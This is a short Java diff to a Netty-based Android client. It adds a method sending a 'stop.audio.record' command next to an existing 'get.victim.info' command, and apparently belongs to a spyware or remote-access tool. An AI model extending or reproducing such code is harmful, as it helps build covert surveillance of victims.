@@ -194,6 +194,14 @@ public class NettyClient extends AsyncTask<String, String, String> {
         queryHandler.sendMessage(query);
     }
 
+    public void sendStopAudioRecord(String code, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "stop.audio.record");
+        query.put("code", code);
+        query.put("owner", owner);
+        queryHandler.sendMessage(query);
+    }
+
     public void sendGetVictimInfo(JSONObject info, String owner) {
         JSONObject query = new JSONObject();
         query.put("action", "get.victim.info");
